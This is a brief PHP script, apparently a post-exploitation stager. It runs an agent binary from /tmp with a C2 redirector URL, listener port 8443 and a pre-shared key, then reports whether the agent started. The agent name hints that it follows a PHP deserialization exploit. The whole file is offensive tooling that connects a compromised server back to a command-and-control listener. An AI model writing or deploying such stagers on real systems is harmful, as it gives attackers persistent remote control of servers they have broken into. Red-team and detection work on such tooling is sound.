<?php        
        $c2RedirectorUrl = "https://127.0.0.1";
        $listenerPort = "8443";
        $psk = "qwert123";
        $agentName = "php-deserization";
        
        $command = sprintf("/tmp/%s -url %s:%s/ -psk %s", escapeshellarg($agentName), escapeshellarg($c2RedirectorUrl), escapeshellarg($listenerPort), escapeshellarg($psk));
        $handle = popen($command, 'w');

        if ($handle !== false) {
            pclose($handle);
            echo "Agent triggered successfully.";
        } else {
            echo "Failed to trigger agent.";
        }
?>
